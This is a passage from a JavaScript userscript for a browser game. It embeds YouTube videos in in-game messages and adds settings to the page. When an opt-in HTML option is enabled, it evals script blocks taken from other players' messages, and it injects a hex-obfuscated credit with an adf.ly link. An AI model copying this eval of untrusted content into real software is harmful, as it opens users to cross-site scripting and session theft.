							tag_vid = '<object width="300" height="225"><param name="movie" value="http://www.youtube.com/v/' + meta2[b].match(RegExpV2)[1] + '"></param><param name="allowFullScreen" value="true"></param><param name="allowscriptaccess" value="always"></param><embed src="http://www.youtube.com/v/zh6PeT8f6Ro?version=3&amp;hl=pt_BR" type="application/x-shockwave-flash" width="560" height="315" allowscriptaccess="always" allowfullscreen="true"></embed></object>';                                           
							modified = modified.replace(meta2[b], tag_vid);              
						}
					}					
					//alert(modified);                
					if (modified != messages[i].innerHTML) messages[i].innerHTML = modified;				
					
					if (allow_html == 'true'){
						if (meta3 != null) {
							for (b = 0; b < meta3.length; b++) {					
								eval(meta3[b].replace(/<\/?script>/g, ''));
							}
						}
					}

				}
			}

			document.getElementById('action_row2').outerHTML += '<br><tr><th colspan="2">' + lang_messages[0] + '</th></tr><tr><td colspan="2"><li>' + lang_messages[1] + ' *</li></td></tr><tr><td colspan="2"><li>' + lang_messages[2] + ' *</li></td></tr><tr><td colspan="2"><input type="checkbox"' + allow_html_check + '" onclick="' + str_setData + ' setCookie(game_data.world + \'_permitir_html\', String(this.checked));void(0);"></input>' + lang_messages[3] + ' *</td></tr><tr><td colspan="2" align="right"><font size="1">' + lang_messages[4] + '</font></td></tr>';
		}        
		
		if (getData(mundo + '_titulo_mundo') == 'true'){
			document.title = mundo.toUpperCase() + ' - ' + document.getElementsByTagName('title')[0].textContent;void(0);
		}
		
		if (getElementsByClass(dhx('7365727665725f696e666f'))[0] != null) getElementsByClass(dhx('7365727665725f696e666f'))[0].innerHTML += dhx('3c7020636c6173733d227365727665725f696e666f223e536372697074206279203c6120687265663d22687474703a2f2f6164662e6c792f423549755922207461726765743d225f626c616e6b223e4665726e616e646f584c52202d20506f696e74446f776e6c6f6164733c2f613e') + lang_settings[18] + '</p>';
		
	}    
}
void(0);